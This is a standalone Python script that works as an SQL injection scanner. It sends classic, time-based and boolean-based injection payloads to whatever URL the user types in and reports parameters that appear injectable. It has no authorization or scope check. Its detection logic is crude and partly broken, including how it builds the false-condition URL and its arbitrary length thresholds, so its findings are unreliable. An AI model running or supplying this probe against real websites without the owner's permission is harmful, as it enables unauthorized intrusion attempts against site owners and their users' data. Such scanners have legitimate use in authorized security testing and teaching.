import requests
import time

# Predefined parameters to append to the URL
PREDEFINED_PARAMS = [
    "?id=1",
    "?q=test",
    "?user=admin",
    "?page=1"
]

# Payloads for Classic SQL Injection (error-based)
CLASSIC_PAYLOADS = [
    "' OR 1=1 --",        # Triggers errors or extra data
    "1' AND '1'='2",      # Should error out
    "' UNION SELECT NULL --"  # Union-based error
]

# Payloads for Blind SQL Injection
BLIND_PAYLOADS = [
    "1' AND IF(1=1, SLEEP(5), 0) --",  # Time-based (MySQL)
    "1' WAITFOR DELAY '0:0:5' --",     # Time-based (SQL Server)
    "1' AND 1=1 --",                   # Boolean true
    "1' AND 1=2 --"                    # Boolean false
]

def scan_url(base_url):
    print(f"Scanning: {base_url}")
    results = []

    for param in PREDEFINED_PARAMS:
        url = base_url + param
        print(f"\nTesting: {url}")

        # Baseline request
        try:
            normal_response = requests.get(url, timeout=5)
            normal_text = normal_response.text
            normal_status = normal_response.status_code
            normal_time = normal_response.elapsed.total_seconds()
            print(f"Normal response: {normal_status}, length: {len(normal_text)}, time: {normal_time:.2f}s")
        except requests.RequestException as e:
            print(f"Error on normal request: {e}")
            continue

        # Test Classic SQL Injection
        print("  Checking Classic SQL Injection:")
        for payload in CLASSIC_PAYLOADS:
            test_url = url + payload
            print(f"    Trying: {test_url}")
            try:
                response = requests.get(test_url, timeout=5)
                response_text = response.text
                response_status = response.status_code
                if (response_status >= 400 or 
                    "error" in response_text.lower() or 
                    "sql" in response_text.lower()):
                    result = f"Classic SQL Injection detected! Status: {response_status}, possible error (Payload: {payload})"
                    print(result)
                    results.append(result)
                elif abs(len(response_text) - len(normal_text)) > 20:
                    result = f"Classic SQL Injection detected! Response length changed: {len(response_text)} (Payload: {payload})"
                    print(result)
                    results.append(result)
                else:
                    print("    No error detected.")
            except requests.RequestException as e:
                print(f"    Error: {e}")

        # Test Blind SQL Injection
        print("  Checking Blind SQL Injection:")
        for payload in BLIND_PAYLOADS:
            test_url = url + payload
            print(f"    Trying: {test_url}")
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed_time = time.time() - start_time
                response_text = response.text

                # Time-based detection
                if elapsed_time > 3:
                    result = f"Blind SQL Injection (Time-based) detected! Delay: {elapsed_time:.2f}s (Payload: {payload})"
                    print(result)
                    results.append(result)
                # Boolean-based detection
                elif "1=1" in payload and "1=2" not in payload:
                    false_url = url + "1' AND 1=2 --"
                    false_response = requests.get(false_url, timeout=5)
                    false_text = false_response.text
                    if len(false_text) != len(response_text):
                        result = f"Blind SQL Injection (Boolean-based) detected! Response differs (Payload: {payload})"
                        print(result)
                        results.append(result)
                    else:
                        print("    No blind vulnerability detected.")
                else:
                    print("    No blind vulnerability detected.")
            except requests.RequestException as e:
                print(f"    Error: {e}")

    return results

if __name__ == "__main__":
    url = input("Enter a URL to scan (e.g., http://example.com): ")
    if not url.startswith("http"):
        url = "http://" + url
    results = scan_url(url)
    print("\nScan complete. Results:")
    for result in results:
        print(result)